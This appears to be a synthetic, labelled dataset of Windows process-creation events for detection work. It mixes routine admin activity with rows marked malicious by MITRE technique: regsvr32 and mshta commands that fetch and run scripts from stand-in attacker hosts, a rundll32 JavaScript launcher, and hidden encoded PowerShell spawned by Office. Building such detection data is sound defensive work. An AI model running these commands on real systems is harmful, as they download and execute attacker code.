UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-05T04:19:10.165Z,{279D26D8-2A3B-410E-A500-69820167FD03},22145,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,62258,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T09:27:42.744Z,{ED548E4B-533B-4819-8B08-5574A155D8F8},17290,C:\Users\itops\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32583,CORP\itops,High,0,,,benign
2024-07-04T11:16:13.338Z,{503F81FB-2A5F-4838-BA49-4C784CF16FAC},43382,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,6181,CORP\mjones,Medium,0,,,benign
2024-07-02T19:50:43.432Z,{93AA4B89-7DBD-45FE-B507-15D7EFA77917},40086,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",5163,CORP\jsmith,Medium,0,,,benign
2024-07-02T05:35:25.516Z,{3B92A016-1C36-4E6F-BB66-1CF4D734CE78},23119,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,44092,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T02:02:47.144Z,{B49C83A5-1B03-4229-80CD-AE2E5BDAB54A},33040,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://evil-payload6653.net/script217.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,43849,CORP\pchen,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-05T14:50:14.141Z,{3D1AF6E8-CC06-45DE-8506-C1471DF3FE69},53544,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s C:\Program Files\Microsoft Office\root\Office16\GROOVEEX.DLL,C:\Windows\System32\cmd.exe,cmd.exe /c,29103,CORP\admin,High,0,,,gray_area
2024-07-03T13:26:02.576Z,{9B058064-A1E8-42C5-BC89-507FFA481F09},57628,C:\Windows\System32\cmd.exe,cmd.exe /c net user,C:\Windows\explorer.exe,C:\Windows\explorer.exe,15501,CORP\klee,Medium,0,,,benign
2024-07-01T15:12:06.032Z,{7A8A6458-3CC9-44A8-AFF7-4EFE9F0C4287},38421,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\WindowsUpdate\Automatic App Update""",C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,43057,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T16:31:49.754Z,{AA38BE97-5511-4DAA-9507-C9473FA67781},30290,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",59302,CORP\analyst01,Low,0,,,benign
2024-07-02T10:41:44.005Z,{54DAC14D-E553-45AF-87CA-A2E9C4F87953},59501,C:\Windows\explorer.exe,explorer.exe C:\Users\analyst02\Documents,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",50215,CORP\analyst02,Medium,0,,,benign
2024-07-02T16:43:31.784Z,{62A20CA8-F94B-403E-BE8D-55614B24AD6F},37140,C:\Windows\System32\taskeng.exe,taskeng.exe {GUID} S,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,11101,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T16:38:42.106Z,{9D6484A7-0424-499A-9EAF-7A97AB5A948A},47294,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,SHCreateLocalServerRunDll {GUID}",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4304,CORP\pchen,Medium,0,,,gray_area
2024-07-02T18:16:24.335Z,{AFB776B0-24BA-4D24-8948-1E3FDD8A06ED},14871,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",30799,CORP\mjones,Medium,0,,,benign
2024-07-04T17:27:24.004Z,{C39DA5DF-033F-4321-9B03-6690F67D2742},47185,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,15076,CORP\agarwal,Medium,0,,,benign
2024-07-04T17:50:31.352Z,{FDADBB80-399E-4FE1-9451-6FBFACC80BF8},60813,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,38070,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T17:52:46.913Z,{0A339E7F-2F8B-439C-8934-BDDE59B44A70},34081,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",28966,CORP\netadmin,Medium,0,,,benign
2024-07-03T12:21:29.803Z,{4F86EDD8-EC68-4F30-AB80-A8B0B08F0A17},14557,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,35151,CORP\admin,High,0,,,benign
2024-07-05T11:12:13.639Z,{A35E3913-5A11-4B50-B754-21FDD445F5D7},47817,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Temp\update_9.5.91.msi /passive /norestart,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20043,CORP\itops,High,0,,,benign
2024-07-02T05:06:15.672Z,{7CAD0EE2-15C9-4FBA-9BFC-169E81284FBA},16804,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,18467,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T09:15:35.615Z,{AF3F344F-4656-410C-A178-DAFBA688B332},40322,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,48263,CORP\sysadmin,High,0,,,benign
2024-07-02T04:47:10.966Z,{43C3B5ED-8DAB-47C9-AF39-C0809F29B52F},37636,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,25204,CORP\admin,High,0,,,gray_area
2024-07-03T01:41:30.895Z,{F3E8AA7C-6F8A-49B2-A309-24E2C9A3E4C5},25327,C:\Program Files\Windows Defender\MsMpEng.exe,"""C:\Program Files\Windows Defender\MsMpEng.exe""",C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,37342,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T14:58:51.585Z,{8F8AC76D-0099-412A-B900-BC8C80BB5DFA},43718,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,13336,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T01:18:12.044Z,{72957AC3-03A4-4E5E-BC89-36501561F0D8},52846,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,14072,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-02T11:47:07.764Z,{86713542-C952-41AF-8798-2B249F7BDE6E},50435,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32386,CORP\jsmith,Medium,0,,,benign
2024-07-02T20:19:39.546Z,{7E8D2167-24B8-4252-8E90-A424F5D699F8},7122,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,33936,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-03T09:43:14.482Z,{8DF326AB-1817-4523-A98C-A3C248336AAB},2640,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",41602,CORP\netadmin,Medium,0,,,benign
2024-07-05T02:57:00.427Z,{2794CA43-F573-4776-9FF0-D4B64123A90D},65237,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host7024.xyz/payloads/file254.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3898,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-03T14:15:09.099Z,{B804F6C6-388A-4ED7-8B28-1E60CA881600},4316,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,20019,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T16:00:41.737Z,{3480E89B-F371-4CCC-A484-3788913DE184},41524,C:\Windows\System32\taskmgr.exe,taskmgr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,5144,CORP\sysadmin,High,0,,,benign
2024-07-05T10:58:51.990Z,{293B9D01-FECC-46F0-BADF-E197BD49CCCB},41067,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,15476,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-06T04:23:22.463Z,{E816868D-91EB-4E09-862F-197EB76F6FAD},32865,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc665.exe"")",C:\Windows\explorer.exe,cmd.exe,33863,CORP\agarwal,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-03T15:35:26.067Z,{3A1B8AB4-724C-43A9-9877-F50991690E6F},32730,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Installers\setup.exe SHA1,C:\Windows\System32\cmd.exe,cmd.exe,2894,CORP\admin,High,0,,,gray_area
2024-07-05T11:00:04.724Z,{21026648-39B1-4FD3-9202-5444B55ABF97},42359,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",4858,CORP\netadmin,Medium,0,,,benign
2024-07-01T14:08:53.645Z,{0A9C0AE5-AADB-41C8-988D-4887DAAAEF9F},16167,C:\Windows\System32\cmd.exe,cmd.exe /c ping 8.8.8.8,C:\Windows\explorer.exe,C:\Windows\explorer.exe,5454,CORP\itops,High,0,,,benign
2024-07-01T12:56:24.911Z,{1B8A535A-7CB4-4243-B0D1-6D46EDA1A39F},54402,C:\Program Files\Docker\Docker\resources\bin\docker.exe,docker.exe ps -a,C:\Windows\System32\cmd.exe,cmd.exe,2931,CORP\mjones,Medium,0,,,benign
2024-07-03T04:58:58.166Z,{2505ADC0-58C6-4BE9-8F9E-9C99A9C175FF},7712,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document2.docm",15278,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-02T12:34:45.235Z,{4B8A044A-E35F-41FB-B9DC-5AA7B34F1EFC},33785,C:\Windows\System32\SearchIndexer.exe,C:\Windows\System32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,37616,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T16:45:35.719Z,{2B7A54C5-4ED5-4827-BE83-EDE646BF18BB},50565,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document72.docm",53597,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-03T12:23:02.410Z,{74C9DEEF-A3A4-4C30-B5F1-CDE81D3537C3},4352,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,38373,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-02T11:44:43.645Z,{E117CA46-4909-4943-86C4-449194BED55C},1609,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_5.7.89.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,20733,CORP\itops,High,0,,,benign
2024-07-04T09:52:04.410Z,{9F162AD7-5093-4A6F-BDA3-425292AFEF34},33227,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",5855,CORP\jsmith,Medium,0,,,benign
2024-07-04T16:19:26.055Z,{3EDCE98B-7454-4B24-AC2B-DFAF49A54AE6},58071,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_4.8.15.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,56983,CORP\sysadmin,High,0,,,benign
2024-07-01T10:30:58.499Z,{1114D528-F698-48A8-8E23-1D5064225EB9},8401,C:\Users\admin\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59169,CORP\admin,High,0,,,benign
2024-07-02T11:53:15.856Z,{20EC19C4-94E5-434B-B1DC-B263D7CAE7AF},41540,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",24332,CORP\klee,Low,0,,,benign
2024-07-03T11:33:38.521Z,{8AC53512-C43D-4591-A291-385848432B81},13363,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,50010,CORP\itops,High,0,,,benign
2024-07-01T11:42:42.363Z,{AEBFC63E-26C4-4685-AEB9-65A5D8D87F9E},11901,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Content C:\Scripts\inventory.ps1 | Out-File C:\Reports\output.txt""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,43401,CORP\agarwal,Medium,0,,,benign
2024-07-03T14:46:10.860Z,{8FEC076E-6497-4BBF-8C21-7F470749D126},31630,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",61263,CORP\helpdesk,Medium,0,,,benign
2024-07-05T12:53:43.389Z,{D58985F9-3497-43FB-9CF1-BE616215CBE2},24030,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Installers\setup.exe SHA1,C:\Windows\System32\cmd.exe,cmd.exe,56210,CORP\sysadmin,High,0,,,gray_area
2024-07-05T01:02:02.140Z,{E0D11265-8837-42FD-86F1-9B584CB1D9F3},47765,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,22826,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-05T11:37:13.832Z,{05534763-1667-4803-A047-5FBDEFA1E5C1},57996,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",16269,CORP\netadmin,Medium,0,,,benign
2024-07-03T09:26:37.315Z,{1602B3D2-7F17-419A-8F78-45455E13BC8C},53216,C:\Windows\System32\cmd.exe,cmd.exe /c ipconfig /all,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59901,CORP\analyst01,Medium,0,,,benign
2024-07-01T17:18:30.490Z,{518554AA-B262-4D7E-8275-9BC202F04237},29866,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",23328,CORP\helpdesk,Medium,0,,,benign
2024-07-04T17:22:36.302Z,{8A1D316C-B916-4379-90BF-2B10BC1E0318},46827,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",20348,CORP\helpdesk,Medium,0,,,benign
2024-07-04T04:31:46.996Z,{F87BB6F6-C3A7-4BE1-8127-9D1C14A2EE70},28323,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,54989,CORP\sysadmin,High,0,,,gray_area
2024-07-03T12:16:41.728Z,{10F55CCD-57C2-497D-90FE-D65BF73852C7},63402,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_2.5.35.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,59482,CORP\sysadmin,High,0,,,benign
2024-07-01T04:05:35.771Z,{C58C3792-EFD4-4B6B-82E9-08F9CC798B7B},1814,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil-payload7721.com/drop/file436.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46426,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-02T17:43:10.775Z,{A7D0A917-3300-42F4-AD23-289A7EAF9DE7},34694,C:\Windows\System32\taskmgr.exe,taskmgr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,10199,CORP\itops,High,0,,,benign
2024-07-02T04:42:28.152Z,{F2E64B78-906D-49D9-82D4-7E4B371D17CB},57776,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-EventLog -LogName Security -After (Get-Date).AddHours(-24) | Export-Csv C:\Reports\security_audit.csv""",C:\Windows\System32\cmd.exe,cmd.exe,48701,CORP\admin,High,0,,,gray_area
2024-07-04T15:07:31.637Z,{B32E3B1E-9BA5-4FFB-8F7E-26CEBC33FCD0},62535,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://internal-wsus.corp.local/package18.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,43348,CORP\itops,High,0,,,gray_area
2024-07-01T10:46:35.286Z,{35779B0E-27B3-41BB-B1E7-A81CD54B938A},58558,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Temp\driver.sys SHA256,C:\Windows\System32\cmd.exe,cmd.exe,29309,CORP\sysadmin,High,0,,,gray_area
2024-07-03T11:00:16.392Z,{8CE95A20-6121-4BB5-BD43-3C5E4542FF76},16435,C:\Windows\System32\cmd.exe,cmd.exe /c netstat -an,C:\Windows\explorer.exe,C:\Windows\explorer.exe,30277,CORP\helpdesk,Medium,0,,,benign
2024-07-01T15:43:07.361Z,{77BCD9CB-C113-43EF-B52B-6BC9866203DE},64703,C:\Windows\System32\wbem\WMIC.exe,wmic.exe process list full,C:\Windows\System32\cmd.exe,cmd.exe,54266,CORP\itops,High,0,,,gray_area
2024-07-06T04:01:07.783Z,{6FB721FD-30F0-4DD3-9CBC-E2BE9F3C336B},19167,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,cmd.exe,33312,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-02T10:51:51.181Z,{7D255665-19F3-4814-8E07-819FFFB9E7B0},58764,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",28020,CORP\netadmin,Medium,0,,,benign
2024-07-03T12:06:08.089Z,{BFCE5A4B-A360-4093-A0DD-1FBF0FC44362},13280,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,29244,CORP\helpdesk,Medium,0,,,benign
2024-07-03T04:42:44.848Z,{67521E88-BD8C-4A06-B46B-8E1B9870C552},63069,C:\Windows\System32\taskhostw.exe,taskhostw.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,49416,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-02T13:05:58.227Z,{8B1281B6-BF3E-45DC-A936-0CB664FE04DF},54523,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,30565,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-05T17:31:45.576Z,{C81F1E1B-64A8-45A6-B086-033B3372ABF7},20647,C:\Windows\System32\lsass.exe,C:\Windows\System32\lsass.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,32122,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-01T12:51:15.568Z,{3D294651-2CF2-44D4-AB2B-1507D51446DA},29325,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,msedge.exe --type=gpu-process,C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe""",57119,CORP\klee,Low,0,,,benign
2024-07-05T08:25:06.707Z,{A05B2C6C-76E1-4397-87E1-569B788BD9B4},11704,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",4934,CORP\dbadmin,Low,0,,,benign
2024-07-03T17:04:57.198Z,{60BEB785-00A4-4457-9299-5059D7B398A3},21826,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,32841,CORP\admin,High,0,,,benign
2024-07-05T16:02:16.174Z,{AF091747-8618-4D99-9ECF-0DF44F0B466E},4939,C:\Program Files\Git\bin\git.exe,git.exe status,C:\Windows\System32\cmd.exe,cmd.exe,19613,CORP\klee,Medium,0,,,benign
2024-07-03T10:06:39.758Z,{D11F31C2-F4C2-41F7-936E-5DF9124CACF8},39458,C:\Windows\System32\cmd.exe,cmd.exe /c net use Z: \\fileserver\share,C:\Windows\explorer.exe,C:\Windows\explorer.exe,16681,CORP\sysadmin,High,0,,,benign
2024-07-04T00:05:25.517Z,{88A435E5-CACD-46BD-9C68-99BC82CF9DA9},30965,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,64352,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-05T15:26:10.188Z,{64E75AA2-4DA6-402C-9FE6-B34DA0EA5797},56981,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",2513,CORP\netadmin,Low,0,,,benign
2024-07-04T04:02:39.634Z,{235D9569-81B0-41E0-A081-728576B3F763},41434,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,17107,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T09:46:57.572Z,{73D0D149-AE8B-40FD-A03C-6FECEB4F6F04},60323,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,65105,CORP\analyst02,Medium,0,,,benign
2024-07-05T09:14:24.394Z,{BCC0A5FB-2C35-4EC8-B9AD-7FE72E43BD41},9664,C:\Program Files\Microsoft OneDrive\OneDrive.exe,OneDrive.exe /sync,C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE,"""C:\Program Files\Microsoft Office\root\Office16\POWERPNT.EXE""",8115,CORP\netadmin,Medium,0,,,benign
2024-07-02T11:49:55.408Z,{61F54E59-EB5C-4DBD-A955-AF5F863D6C6E},6845,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server2,C:\Windows\System32\cmd.exe,cmd.exe,2344,CORP\sysadmin,High,0,,,gray_area
2024-07-04T10:56:18.740Z,{D6F2D15C-2549-4957-8469-28EBA7BEB6D0},47621,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://repo.corp.local/package46.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,26583,CORP\itops,High,0,,,gray_area
2024-07-03T08:58:33.841Z,{34BCD111-6D54-48E3-AC97-6E2DAE927B13},51495,C:\Windows\System32\mmc.exe,mmc.exe diskmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,25573,CORP\itops,High,0,,,benign
2024-07-03T14:06:00.100Z,{F3A8EF8A-DBC7-49F8-9EF9-8E1F28F6FDDE},17956,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,15549,CORP\admin,High,0,,,benign
2024-07-03T11:17:30.981Z,{78118FEA-8E7A-4297-90FA-A7B751E3CF48},41179,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",23485,CORP\dbadmin,Low,0,,,benign
2024-07-02T10:39:54.654Z,{330180D7-7B3B-4A10-AB4E-8796172582C3},59788,C:\Windows\System32\cmd.exe,cmd.exe /c xcopy C:\Data D:\Backup /s /e,C:\Windows\explorer.exe,C:\Windows\explorer.exe,27574,CORP\admin,High,0,,,benign
